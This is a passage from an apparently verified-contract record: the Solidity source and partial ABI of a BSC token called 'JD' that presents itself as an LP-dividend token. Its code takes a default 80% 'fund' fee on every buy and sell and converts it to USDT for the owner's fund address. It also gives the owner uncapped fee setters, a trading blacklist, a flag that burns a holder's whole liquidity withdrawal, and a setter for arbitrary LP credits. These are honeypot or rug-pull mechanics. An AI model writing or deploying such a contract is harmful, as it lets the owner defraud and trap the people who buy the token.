{"SourceCode": "// SPDX-License-Identifier: MIT\r\n\r\npragma solidity ^0.8.17;\r\n\r\ninterface IERC20 {\r\n    function decimals() external view returns (uint8);\r\n\r\n    function symbol() external view returns (string memory);\r\n\r\n    function name() external view returns (string memory);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n}\r\n\r\ninterface ISwapRouter {\r\n    function factory() external pure returns (address);\r\n\r\n    function swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n        uint amountIn,\r\n        uint amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint deadline\r\n    ) external;\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint amountADesired,\r\n        uint amountBDesired,\r\n        uint amountAMin,\r\n        uint amountBMin,\r\n        address to,\r\n        uint deadline\r\n    ) external returns (uint amountA, uint amountB, uint liquidity);\r\n}\r\n\r\ninterface ISwapFactory {\r\n    function createPair(address tokenA, address tokenB) external returns (address pair);\r\n\r\n    function feeTo() external view returns (address);\r\n}\r\n\r\ninterface ISwapPair {\r\n    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function sync() external;\r\n}\r\n\r\nabstract contract Ownable {\r\n    address internal _owner;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor () {\r\n        address msgSender = msg.sender;\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n    modifier onlyOwner() {\r\n        require(_owner == msg.sender, \"!owner\");\r\n        _;\r\n    }\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"new 0\");\r\n        emit OwnershipTransferred(_owner, newOwner);\r\n        _owner = newOwner;\r\n    }\r\n}\r\n\r\ncontract TokenDistributor {\r\n    constructor (address token) {\r\n        IERC20(token).approve(msg.sender, uint(~uint256(0)));\r\n    }\r\n}\r\n\r\nabstract contract AbsToken is IERC20, Ownable {\r\n    mapping(address => uint256) private _userLPAmount;\r\n    address public _lastTxAccount;\r\n    uint256 public _totalLPAmount;\r\n\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n mapping(address => uint256)public black_lp;\r\n    address public fundAddress;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n    uint8 private _decimals;\r\n    mapping(address => bool) public _feeWhiteList;\r\n    mapping(address => bool) public _blackList;\r\n    uint256 private _tTotal;\r\n    ISwapRouter public _swapRouter;\r\n    ISwapFactory _swapFactory;\r\n    address public _usdt;\r\n    mapping(address => bool) public _swapPairList;\r\n\r\n    bool private inSwap;\r\n\r\n    uint256 public constant MAX = ~uint256(0);\r\n\r\n   \r\n    uint256 public _fundFee = 8000;\r\n    uint256 public _burnfee=70;\r\n    uint256 public _LPDividendFee = 70;\r\n\r\n    uint256 public startTradeBlock;\r\n \r\n  uint256 public _removeLPFee = 100;\r\n    address public _mainPair;\r\n\r\n    TokenDistributor public _tokenDistributor;\r\n   \r\n \r\n    uint256 public _numToSell;\r\n \r\n  \r\n\r\n    modifier lockTheSwap {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor (\r\n        address RouterAddress, address USDTAddress,\r\n        string memory Name, string memory Symbol, uint8 Decimals, uint256 Supply,\r\n        address FundAddress, address ReceiveAddress\r\n    ){\r\n        _name = Name;\r\n        _symbol = Symbol;\r\n        _decimals = Decimals;\r\n\r\n        IERC20(USDTAddress).approve(RouterAddress, MAX);\r\n        ISwapRouter swapRouter = ISwapRouter(RouterAddress);\r\n        _allowances[address(this)][RouterAddress] = MAX;\r\n\r\n        _usdt = USDTAddress;\r\n        _swapRouter = swapRouter;\r\n\r\n        ISwapFactory swapFactory = ISwapFactory(swapRouter.factory());\r\n        address swapPair = swapFactory.createPair(address(this), USDTAddress);\r\n        _swapFactory = swapFactory;\r\n        _mainPair = swapPair;\r\n        _swapPairList[swapPair] = true;\r\n\r\n        uint256 total = Supply * 10 ** Decimals;\r\n        _tTotal = total;\r\n\r\n        _balances[ReceiveAddress] = total;\r\n        emit Transfer(address(0), ReceiveAddress, total);\r\n\r\n        fundAddress = FundAddress;\r\n\r\n        _feeWhiteList[FundAddress] = true;\r\n        _feeWhiteList[ReceiveAddress] = true;\r\n        _feeWhiteList[address(this)] = true;\r\n        _feeWhiteList[address(swapRouter)] = true;\r\n        _feeWhiteList[msg.sender] = true;\r\n        _feeWhiteList[address(0)] = true;\r\n        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;\r\n\r\n        excludeHolder[address(0)] = true;\r\n        excludeHolder[address(0x000000000000000000000000000000000000dEaD)] = true;\r\n\r\n        _tokenDistributor = new TokenDistributor(USDTAddress);\r\n\r\n        holderRewardCondition = 1 * 10 ** Decimals;\r\n\r\n        _feeWhiteList[address(_tokenDistributor)] = true;\r\n\r\n     \r\n        _numToSell = 1 * 10 ** 15;\r\n     \r\n        addHolder(FundAddress);\r\n    }\r\n\r\n    function symbol() external view override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function name() external view override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function decimals() external view override returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public view override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function validTotal() public view returns (uint256) {\r\n        return _tTotal - _balances[address(0)] - _balances[address(0x000000000000000000000000000000000000dEaD)];\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(msg.sender, recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public override returns (bool) {\r\n        _approve(msg.sender, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (_allowances[sender][msg.sender] != MAX) {\r\n            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;\r\n        }\r\n        return true;\r\n    }\r\n\r\n    function _approve(address owner, address spender, uint256 amount) private {\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        uint256 balance = balanceOf(from);\r\n        require(balance >= amount, \"balanceNotEnough\");\r\n\r\n        _calLPAmount();\r\n\r\n        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\r\n            require(!_blackList[from] && !_blackList[to]);\r\n            uint256 maxSellAmount = balance * 99999 / 100000;\r\n            if (amount > maxSellAmount) {\r\n                amount = maxSellAmount;\r\n            }\r\n        }\r\n\r\n        bool takeFee;\r\n        uint256 fee_amount = 0;\r\n        if (_swapPairList[from] || _swapPairList[to]) {\r\n        \r\n            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {\r\n                takeFee = true;\r\n             \r\n                bool isAdd;\r\n                 bool isRemove;\r\n                if (_swapPairList[to]) {\r\n                    isAdd = _isAddLiquidity();\r\n                    if (isAdd) {\r\n                        takeFee = false;\r\n                    }\r\n                    }else if (_swapPairList[from]) {\r\n                       isRemove = _isRemoveLiquidity();\r\n                    if (isRemove) {\r\n                         takeFee = false;\r\n                         if(black_lp[to] == 1){\r\n                         uint256 burn_lpamount =  amount;\r\n                         fee_amount = fee_amount + burn_lpamount;\r\n                        _takeTransfer(from, address(0x000000000000000000000000000000000000dEaD), burn_lpamount);\r\n                      }else{\r\n                        fee_amount = amount * _removeLPFee / 10000;\r\n                       _takeTransfer(from, address(0x000000000000000000000000000000000000dEaD), fee_amount); \r\n                    }\r\n                    }\r\n                }   \r\n                  if (!isAdd && !isRemove) {\r\n                      require(startTradeBlock > 0);\r\n                    }\r\n\r\n            }\r\n        }\r\n        _tokenTransfer(from, to, amount-fee_amount, takeFee);\r\n        if (from != address(this)) {\r\n            if (_swapPairList[to]) {\r\n                _lastTxAccount = from;\r\n            } else if (_swapPairList[from]) {\r\n                bool isRemove = _isRemoveLiquidity();\r\n                if (isRemove) {\r\n                    IERC20 mainPair = IERC20(_mainPair);\r\n                    uint256 totalPair = mainPair.totalSupply();\r\n                    address feeTo = _swapFactory.feeTo();\r\n                    if (address(0) != feeTo) {\r\n                        uint256 feeLP = mainPair.balanceOf(feeTo);\r\n                        if (totalPair > feeLP) {\r\n                            totalPair -= feeLP;\r\n                        } else {\r\n                            totalPair = 0;\r\n                        }\r\n                    }\r\n                    uint256 totalLPAmount = _totalLPAmount;\r\n                    if (totalLPAmount > totalPair) {\r\n                        uint256 rmAmount = totalLPAmount - totalPair;\r\n                        uint256 userLPAmount = _userLPAmount[to];\r\n                        require(userLPAmount >= rmAmount, \"no LPAmount\");\r\n                        _userLPAmount[to] -= rmAmount;\r\n                        _totalLPAmount -= rmAmount;\r\n                    }\r\n                }\r\n            }\r\n            processReward(500000);\r\n        }\r\n    }\r\n\r\n    function _calLPAmount() public {\r\n        address lastTxAccount = _lastTxAccount;\r\n        if (lastTxAccount != address(0)) {\r\n            _lastTxAccount = address(0);\r\n\r\n            IERC20 mainPair = IERC20(_mainPair);\r\n            uint256 totalPair = mainPair.totalSupply();\r\n\r\n            address feeTo = _swapFactory.feeTo();\r\n            if (address(0) != feeTo) {\r\n                uint256 feeLP = mainPair.balanceOf(feeTo);\r\n                if (totalPair > feeLP) {\r\n                    totalPair -= feeLP;\r\n                } else {\r\n                    totalPair = 0;\r\n                }\r\n            }\r\n\r\n            uint256 totalLPAmount = _totalLPAmount;\r\n            if (totalPair > totalLPAmount) {\r\n                addHolder(lastTxAccount);\r\n                uint256 addAmount = totalPair - totalLPAmount;\r\n                _userLPAmount[lastTxAccount] += addAmount;\r\n                _totalLPAmount += addAmount;\r\n            }\r\n        }\r\n    }\r\n\r\n\r\n    function _isAddLiquidity() internal view returns (bool isAdd){\r\n        ISwapPair mainPair = ISwapPair(_mainPair);\r\n        (uint r0,uint256 r1,) = mainPair.getReserves();\r\n\r\n        address tokenOther = _usdt;\r\n        uint256 r;\r\n        if (tokenOther < address(this)) {\r\n            r = r0;\r\n        } else {\r\n            r = r1;\r\n        }\r\n\r\n        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));\r\n        isAdd = bal > r;\r\n    }\r\n\r\n    function _isRemoveLiquidity() internal view returns (bool isRemove){\r\n        ISwapPair mainPair = ISwapPair(_mainPair);\r\n        (uint r0,uint256 r1,) = mainPair.getReserves();\r\n\r\n        address tokenOther = _usdt;\r\n        uint256 r;\r\n        if (tokenOther < address(this)) {\r\n            r = r0;\r\n        } else {\r\n            r = r1;\r\n        }\r\n\r\n        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));\r\n        isRemove = r >= bal;\r\n    }\r\n\r\n    function _funTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount = tAmount * 99 / 100;\r\n        _takeTransfer(sender, fundAddress, feeAmount);\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n    function _tokenTransfer(\r\n        address sender,\r\n        address recipient,\r\n        uint256 tAmount,\r\n        bool takeFee\r\n    ) private {\r\n        _balances[sender] = _balances[sender] - tAmount;\r\n        uint256 feeAmount;\r\n        if (takeFee) {\r\n            bool isSell;\r\n            if (_swapPairList[sender]) {\r\n                uint256 fundFeeAmount = tAmount * _fundFee / 10000;\r\n                if (fundFeeAmount > 0) {\r\n                    feeAmount += fundFeeAmount;\r\n                        _takeTransfer(sender,  address(this), fundFeeAmount);              \r\n                }               \r\n                uint256 lpDividendFeeAmount = tAmount * _LPDividendFee / 10000;\r\n                if (lpDividendFeeAmount > 0) {\r\n                    feeAmount += lpDividendFeeAmount;\r\n                    _takeTransfer(sender, address(this), lpDividendFeeAmount);\r\n                }\r\n                 uint256 BurnFeeAmount = tAmount * _burnfee / 10000;\r\n                if (BurnFeeAmount > 0) {\r\n                    feeAmount += BurnFeeAmount;\r\n                    _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), BurnFeeAmount);\r\n                }\r\n            } else {\r\n                isSell = true;\r\n               uint256 fundFeeAmount = tAmount * _fundFee / 10000;\r\n                if (fundFeeAmount > 0) {\r\n                      feeAmount += fundFeeAmount;               \r\n                        _takeTransfer(sender,  address(this), fundFeeAmount);             \r\n                }\r\n              uint256 BurnFeeAmount = tAmount * _burnfee / 10000;\r\n                if (BurnFeeAmount > 0) {\r\n                    feeAmount += BurnFeeAmount;\r\n                    _takeTransfer(sender, address(0x000000000000000000000000000000000000dEaD), BurnFeeAmount);\r\n                }           \r\n                uint256 lpDividendFeeAmount = tAmount * _LPDividendFee / 10000;\r\n                if (lpDividendFeeAmount > 0) {\r\n                    feeAmount += lpDividendFeeAmount;\r\n                    _takeTransfer(sender, address(this), lpDividendFeeAmount);\r\n                }\r\n            }\r\n            if (!inSwap && isSell) {             \r\n                uint256 numTokensSellToFund = _numToSell;\r\n                   uint256 contractTokenBalance = balanceOf(address(this));\r\n                if (contractTokenBalance >= numTokensSellToFund) {          \r\n                    swapTokenForFund(contractTokenBalance);\r\n                }\r\n            }\r\n        }\r\n        _takeTransfer(sender, recipient, tAmount - feeAmount);\r\n    }\r\n\r\n   \r\n   function swapTokenForFund(uint256 tokenAmount) private lockTheSwap {\r\n        if (0 == tokenAmount) {\r\n            return;\r\n        }\r\n        uint256 fundFee = _fundFee*2;\r\n      \r\n        uint256 lpDividendFee = _LPDividendFee*2;    \r\n        uint256 totalFee = fundFee   + lpDividendFee ;\r\n        totalFee += totalFee;\r\n        address[] memory path = new address[](2);\r\n        address usdt = _usdt;\r\n        path[0] = address(this);\r\n        path[1] = usdt;\r\n        address tokenDistributor = address(_tokenDistributor);\r\n        _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            tokenDistributor,\r\n            block.timestamp\r\n        );\r\n\r\n        IERC20 USDT = IERC20(usdt);\r\n        uint256 usdtBalance = USDT.balanceOf(tokenDistributor);\r\n        USDT.transferFrom(tokenDistributor, address(this), usdtBalance);\r\n\r\n        uint256 fundUsdt = usdtBalance * fundFee / totalFee;\r\n        if (fundUsdt > 0) {\r\n            USDT.transfer(fundAddress, fundUsdt);\r\n        }      \r\n    }\r\n\r\n    function _takeTransfer(address sender, address to, uint256 tAmount) private {\r\n        _balances[to] = _balances[to] + tAmount;\r\n        emit Transfer(sender, to, tAmount);\r\n    }\r\n\r\n    function setFundAddress(address addr) external onlyOwner {\r\n        fundAddress = addr;\r\n        _feeWhiteList[addr] = true;\r\n        addHolder(addr);\r\n    }\r\n\r\n  \r\n\r\n    function setFeeWhiteList(address addr, bool enable) external onlyOwner {\r\n        _feeWhiteList[addr] = enable;\r\n    }\r\n\r\n   function setFeeblackList(address addr, bool enable) external onlyOwner {\r\n        _blackList[addr] = enable;\r\n    }\r\n\r\n    function batchSetFeeWhiteList(address [] memory addr, bool enable) external onlyOwner {\r\n        for (uint i = 0; i < addr.length; i++) {\r\n            _feeWhiteList[addr[i]] = enable;\r\n        }\r\n    }\r\n\r\n    function batchSetBlackLp(address [] memory addr) external onlyOwner {\r\n        for (uint i = 0; i < addr.length; i++) {\r\n            black_lp[addr[i]] = 1;\r\n        }\r\n    }\r\n\r\n\r\n    function setSwapPairList(address addr, bool enable) external onlyOwner {\r\n        _swapPairList[addr] = enable;\r\n    }\r\n\r\n    function claimBalance() external {\r\n        payable(fundAddress).transfer(address(this).balance);\r\n    }\r\n\r\n \r\n\r\n    receive() external payable {}\r\n\r\n    address[] public holders;\r\n    mapping(address => uint256) public holderIndex;\r\n    mapping(address => bool) public excludeHolder;\r\n\r\n    function getHolderLength() public view returns (uint256){\r\n        return holders.length;\r\n    }\r\n\r\n    function addHolder(address adr) private {\r\n        if (0 == holderIndex[adr]) {\r\n            if (0 == holders.length || holders[0] != adr) {\r\n                uint256 size;\r\n                assembly {size := extcodesize(adr)}\r\n                if (size > 0) {\r\n                    return;\r\n                }\r\n                holderIndex[adr] = holders.length;\r\n                holders.push(adr);\r\n            }\r\n        }\r\n    }\r\n\r\n    uint256 public currentIndex;\r\n    uint256 public holderRewardCondition;\r\n    uint256 public holderCondition = 1;\r\n    uint256 public progressRewardBlock;\r\n    uint256 public _progressBlockDebt = 0;\r\n\r\n    function processReward(uint256 gas) private {\r\n   \r\n        if (progressRewardBlock + _progressBlockDebt > block.number) {\r\n            return;\r\n        }\r\n\r\n        uint holdTokenTotal = _totalLPAmount;\r\n        if (0 == holdTokenTotal) {\r\n            return;\r\n        }\r\n        uint256 totalPair = IERC20(_mainPair).totalSupply();\r\n        if (totalPair > holdTokenTotal) {\r\n            holdTokenTotal = totalPair;\r\n        }\r\n\r\n        uint256 holdCondition = holderCondition;\r\n\r\n        address sender = address(_tokenDistributor);\r\n         IERC20 usdt = IERC20(_usdt);\r\n\r\n        uint256 balance = usdt.balanceOf(address(this));\r\n        if (balance < holderRewardCondition) {\r\n            return;\r\n        }\r\n        balance = holderRewardCondition;\r\n\r\n        address shareHolder;\r\n        uint256 tokenBalance;\r\n        uint256 amount;\r\n\r\n        uint256 shareholderCount = holders.length;\r\n\r\n        uint256 gasUsed = 0;\r\n        uint256 iterations = 0;\r\n        uint256 gasLeft = gasleft();\r\n\r\n        while (gasUsed < gas && iterations < shareholderCount) {\r\n            if (currentIndex >= shareholderCount) {\r\n                currentIndex = 0;\r\n            }\r\n            shareHolder = holders[currentIndex];\r\n            tokenBalance = _userLPAmount[shareHolder];\r\n            if (tokenBalance >= holdCondition && !excludeHolder[shareHolder]) {\r\n                amount = balance * tokenBalance / holdTokenTotal;\r\n                if (amount > 0) {\r\n                     usdt.transfer(shareHolder, amount);\r\n                }\r\n            }\r\n\r\n            gasUsed = gasUsed + (gasLeft - gasleft());\r\n            gasLeft = gasleft();\r\n            currentIndex++;\r\n            iterations++;\r\n        }\r\n\r\n        progressRewardBlock = block.number;\r\n    }\r\n\r\n    function setHolderRewardCondition(uint256 amount) external onlyOwner {\r\n        holderRewardCondition = amount;\r\n    }\r\n\r\n    function setHolderCondition(uint256 amount) external onlyOwner {\r\n        holderCondition = amount;\r\n    }\r\n\r\n    function setExcludeHolder(address addr, bool enable) external onlyOwner {\r\n        excludeHolder[addr] = enable;\r\n    }\r\n\r\n    function setProgressBlockDebt(uint256 progressBlockDebt) external onlyOwner {\r\n        _progressBlockDebt = progressBlockDebt;\r\n    }\r\n\r\n    function start( ) external onlyOwner {\r\n       \r\n        startTradeBlock = block.number;\r\n     \r\n    }\r\n     function setuserLp(address addr, uint256 _value) external onlyOwner {\r\n        _userLPAmount[addr] = _value;\r\n    }\r\n    function setBuyFee( uint256 fundFee,uint256 burnfee) external onlyOwner {\r\n       \r\n        _fundFee = fundFee;\r\n        _burnfee = burnfee;\r\n    }\r\n\r\n    function setSellFee(uint256 lpDividendFee) external onlyOwner {\r\n        _LPDividendFee = lpDividendFee;\r\n    }\r\n\r\n    function setNumToSell(uint256 amount) external onlyOwner {\r\n        _numToSell = amount;\r\n    }\r\n\r\n\r\n\r\n    function getUserInfo(address account) public view returns (\r\n        uint256 amount, uint256 lpBalance\r\n    ) {\r\n        amount = _userLPAmount[account];\r\n        lpBalance = IERC20(_mainPair).balanceOf(account);\r\n    }\r\n     function SetBlackLp(address addr,uint256 _value) external onlyOwner {\r\n            black_lp[addr] = _value;\r\n    }\r\n}\r\n\r\ncontract JD is AbsToken {\r\n    constructor() AbsToken(\r\n        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),\r\n     address(0x55d398326f99059fF775485246999027B3197955),\r\n        \"JD\",\r\n        \"JD\",\r\n        18,\r\n        18888,\r\n        address(0xaBBD884EE8698f255bfcCF17df5feDAF2a8f0967),\r\n        address(0x1bEfc4Dbe4a64Fb29409F7286ee42C92515a01Ca)\r\n    ){\r\n\r\n    }\r\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"previousOwner\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"newOwner\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"to\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[],\"name\":\"MAX\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"addr\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"_value\",\"type\":\"uint256\"}],\"name\":\"SetBlackLp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_LPDividendFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_blackList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_burnfee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_calLPAmount\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_feeWhiteList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_fundFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_lastTxAccount\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_mainPair\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_numToSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_progressBlockDebt\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_removeLPFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"_swapPairList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_swapRouter\",\"outputs\":[{\"internalType\":\"contract ISwapRouter\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_tokenDistributor\",\"outputs\":[{\"internalType\":\"contract TokenDistributor\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_totalLPAmount\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"_usdt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"owner\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"}],\"name\":\"batchSetBlackLp\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address[]\",\"name\":\"addr\",\"type\":\"address[]\"},{\"internalType\":\"bool\",\"name\":\"enable\",\"type\":\"bool\"}],\"name\":\"batchSetFeeWhiteList\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"black_lp\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"claimBalance\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"currentIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"excludeHolder\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAddress\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getHolderLength\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"account\",\"type\":\"address\"}],\"name\":\"getUserInfo\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"amount\",\"type\":\"uint256\"},{\"internalType\":\"uint256\",\"name\":\"lpBalance\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"holderCondition\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"holderIndex\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"holderRewardCondition\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"name\":\"holders\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\"